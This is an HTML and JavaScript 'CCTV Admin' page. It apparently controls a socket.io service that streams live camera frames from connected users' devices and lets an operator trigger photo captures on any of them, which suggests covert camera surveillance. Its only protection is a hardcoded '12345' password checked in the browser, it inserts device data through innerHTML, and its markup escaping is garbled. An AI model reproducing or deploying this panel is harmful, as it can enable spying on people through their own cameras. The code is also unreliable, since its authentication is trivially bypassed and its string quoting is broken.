<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>CCTV Admin</title>
<style>
body { font-family: Arial; background: #121212; color: #fff; margin: 0; padding: 20px; }
#login { position: fixed; top:0; left:0; width:100%; height:100%; background:#0a0a0a; display:flex; flex-direction:column; align-items:center; justify-content:center; z-index:100; }
input, button { padding: 10px; margin: 5px; font-size: 15px; border-radius: 5px; border: none; }
button { background: #00e676; font-weight: bold; cursor: pointer; }
.grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(280px, 1fr)); gap: 15px; margin-top: 20px; }
.card { background: #1a1a1a; border: 1px solid #333; border-radius: 6px; overflow: hidden; }
.head { background: #252525; padding: 8px; font-size: 12px; display: flex; justify-content: space-between; }
.body img { width: 100%; height: 200px; object-fit: cover; background: #000; display: block; }
.footer { padding: 8px; background: #1e1e1e; }
.footer button { width: 100%; background: #ff1744; color: #fff; }
</style>
</head>
<body>
<div id="login">
<h2>?? Admin Login</h2>
<input type="password" id="p" placeholder="Password (12345)">
<button onclick="login()">Login</button>
</div>
<h2>?? CCTV Multi-Screen Dashboard</h2>
<span id="cnt">Active: 0</span>
<div class="grid" id="grid"></div>
<script src="/socket.io/socket.io.js"></script>
<script>
const socket = io();
function login() {
if(document.getElementById('p').value === '12345') {
document.getElementById('login').style.display = 'none';
socket.emit('admin-auth-success');
} else alert('Wrong Password');
}
function capture(id) { socket.emit('admin-trigger-capture', id); }
socket.on('update-users-list', (users) => {
const keys = Object.keys(users);
document.getElementById('cnt').innerText = 'Active Users: ' + keys.length;
const grid = document.getElementById('grid');
grid.innerHTML = '';
keys.forEach((id, idx) => {
const dev = users[id].deviceInfo || 'Device';
grid.innerHTML += '<div class=\card\ id=\c_' + id + '\><div class=\head\><span>CAM ' + (idx+1) + ': ' + dev + '</span><span style=\color:red\>? LIVE</span></div><div class=\ody\><img id=\img_' + id + '\ src=\\></div><div class=\ooter\><button onclick=\capture(\\'' + id + '\\')\>?? Capture Photo</button></div></div>';
});
});
socket.on('update-live-stream', (d) => {
const img = document.getElementById('img_' + d.socketId);
if(img) img.src = d.frameData;
});
</script>
</body>
</html>
